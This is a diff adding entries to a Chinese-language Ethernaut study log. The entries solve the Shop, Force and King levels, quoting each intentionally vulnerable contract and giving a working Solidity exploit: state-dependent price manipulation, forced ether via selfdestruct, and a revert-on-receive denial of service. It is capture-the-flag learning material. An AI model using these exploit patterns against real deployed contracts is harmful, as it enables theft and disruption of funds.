@@ -153,6 +153,130 @@ contract MockBuilding {
 
 ### 2024.08.31
 
+Ethernaut 
+#### Shop
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) { //调用者的price>=100且从未buy过
+            isSold = true;
+            price = _buyer.price(); 
+        }
+    }
+}
+```
+
+要求price<100
+
+看起来类似电梯那个题目，但是buyer.price()是view的函数，不能更改状态。所以只能利用外部进行。发现isSold变量在两次调用price之间有更改。因此写合约利用这个isSold返回不同的bool值.
+
+```
+contract buyer{
+    address shop =0xc3Ce8A0921980063AadA4cf475CA91C7e8E81a63;
+    function price() external view returns (uint256){
+        if (Shop(shop).isSold()==false){
+            return 120;
+        }else{
+            return 0;
+        }
+    }
+    function callshop()external{
+        Shop(shop).buy();
+    }
+}
+```
+
+
+
+#### Force
+
+这一关的目标是使合约的余额大于0
+
+这个合约没有实现任何方法来接受以太。
+
+但是可以通过合约自毁的方式，指定将余额转给Force合约。
+
+POC:
+
+```
+pragma solidity ^0.8.0;
+
+contract mine{
+    constructor()payable {
+    }
+
+    function forcetransfer()public {
+        selfdestruct(payable(0xcaa382a24236a3FB17A40367e4FC0961214B8cF3));
+    }
+
+}
+```
+
+
+
+#### King
+
+要求成为king，阻止关卡重新声明王位
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+给大于prize的value，或作为owner就可以改变king
+
+为了防止owner改变king，我们成为king之后，让这个transfer失败回滚.
+
+```
+contract tobeking{
+    constructor() payable {
+    }
+    receive() external payable {
+        revert();
+    }
+    function start(address king)public payable{
+         payable(king).transfer(msg.value);
+    }
+}
+```
+
+### 2024.09.01
 
 
 <!-- Content_END -->
